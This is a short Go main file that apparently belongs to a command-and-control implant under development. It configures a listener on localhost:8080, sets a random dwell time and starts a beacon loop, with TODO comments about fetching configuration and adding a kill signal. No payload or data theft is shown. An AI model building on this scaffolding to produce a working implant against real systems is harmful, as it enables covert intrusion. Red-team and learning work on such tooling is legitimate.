package main

import "math/rand/v2"

/*
TODO:
- fix field/method visibility in structs?
- implant be separate package?
*/

// move TaskRequest, Result structs to another file?

func main() {
	// implant is configured w/ initial hardcoded values
	// TODO: implant should reach out for configuration values initially, then start beacon??

	listenerHost := "localhost"
	listenerPort := "8080"
	STARTDWELLTIME := rand.IntN(30) // random int number of minutes between 0 and 30

	implant := NewImplant(listenerHost, listenerPort, STARTDWELLTIME) // TODO: should be implant.New()

	// TODO: check over the names of these functions, if they make sense to be called like this in this order?
	implant.BeaconLoop()

	// TODO: have a kill signal
}
